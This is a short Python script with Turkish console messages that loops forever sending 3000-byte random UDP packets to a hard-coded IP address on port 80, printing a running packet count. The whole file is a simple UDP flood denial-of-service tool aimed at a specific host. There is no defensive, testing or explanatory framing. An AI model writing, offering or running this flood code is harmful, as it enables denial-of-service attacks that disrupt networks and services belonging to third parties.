import socket
import random
import os
tip = '216.58.208.100'
tport = 80
bytes = random._urandom(3000)
socket = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
s = 0
while 1:
	s+=1
	print("Paket Gönderimi Başladı")
	print("Gönderilen Paket Sayısı:",s)
	socket.sendto(bytes,(tip,tport))
